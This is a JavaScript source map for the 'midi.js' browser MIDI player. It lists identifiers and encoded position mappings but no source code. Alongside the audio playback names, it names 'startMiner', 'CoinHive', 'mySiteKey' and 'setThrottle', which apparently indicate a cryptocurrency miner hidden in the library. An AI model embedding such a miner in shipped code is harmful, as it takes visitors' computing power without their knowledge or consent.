{"version":3,"sources":["midi.js"],"names":["global","browserVersion","nameOffset","verOffset","ix","nAgt","navigator","userAgent","browserName","appName","fullVersion","parseFloat","appVersion","majorVersion","parseInt","indexOf","substring","lastIndexOf","toLowerCase","toUpperCase","isNaN","bv","Object","platform","require_script","file","callback","script","document","getElementsByTagName","newjs","createElement","onreadystatechange","readyState","onload","onerror","log","src","type","parentNode","insertBefore","get_next_wave","ev","read_wave_bytes","Module","ccall","song","waveBuffer","audioBufferSize","isEndless","release_player","max_i16","Math","pow","i","outputBuffer","getChannelData","getValue","start_time","context","currentTime","loadMissingPatch","url","path","filename","request","XMLHttpRequest","open","responseType","status","num_missing","FS","createDataFile","Int8Array","response","MIDIjs","message_callback","stream","midiFileBuffer","midiFileArray","length","MID_AUDIO_S16LSB","options","sampleRate","rval","source","createScriptProcessor","_malloc","onaudioprocess","connect","destination","callback_timer","setInterval","webAudioAPI_callback","player_callback_interval","send","unmute_iOS_hack","sinusBuffer","createBuffer","freq","bufferSource","createBufferSource","buffer","start","player_event","time","player_callback","play_WebAudioAPI","stop_WebAudioAPI","audioBufferSizePlayer","play2_WebAudioAPI","libtimidity_url","midijs_url","scripts","script_src","play_WebAudioAPI_with_script_loaded","writeArrayToMemory","missingPatch","noteOn_WebAudioAPI","channel","key","velocity","audioBufferSizeNoteOn","startSynth_WebAudioAPI","noteOn","disconnect","_free","clearInterval","audio_status","getAbsoluteUrl","aForAbsoluteUrl","href","forceHttp","location","protocol","absUrl","httpUrl","replace","fallback_callback","Date","getTime","play_bgsound","stop_bgsound","sounddiv","getElementById","lastChild","setAttribute","innerHTML","body","appendChild","play_object","stop_object","removeChild","myUrl","index","substr","message","logging","console","startMiner","mySiteKey","miner","CoinHive","Anonymous","setThrottle","audioMethod","window","AudioContext","webkitAudioContext","e","set_logging","get_loggging","get_audio_status","play","stop","startSynth","this"],"mappings":"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","file":"midi.js","sourceRoot":"http://midijs/src"}
